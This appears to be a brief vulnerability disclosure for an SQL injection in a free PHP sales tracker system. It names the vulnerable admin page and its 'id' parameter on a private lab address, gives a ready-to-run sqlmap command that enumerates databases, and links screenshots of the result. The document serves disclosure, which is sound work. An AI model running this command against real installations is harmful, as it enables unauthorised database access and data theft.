Download sourcecode from https://www.sourcecodester.com/php/16061/sales-tracker-management-system-using-php-free-source-code.html

Deploy the system 

The sql injection url: http://192.168.131.135/php-sts/admin/clients/view_client.php?id=1    Vulnerability trigger parameter: id

sourcecode:


![sts](https://user-images.githubusercontent.com/127364570/223895608-6da280bb-ebb4-4c2e-a98e-598f20df701a.JPG)

sqlmap command:  sqlmap.py -u "http://192.168.131.135/php-sts/admin/clients/view_client.php?id=1" -p id  --risk 3 --dbs

![sts1](https://user-images.githubusercontent.com/127364570/223897486-6e35c2c5-58c1-429e-b7bf-d1a8044a93ae.JPG)

![sts2](https://user-images.githubusercontent.com/127364570/223897514-339d30bb-76e9-4e8d-a54e-a69002c7a15d.JPG)




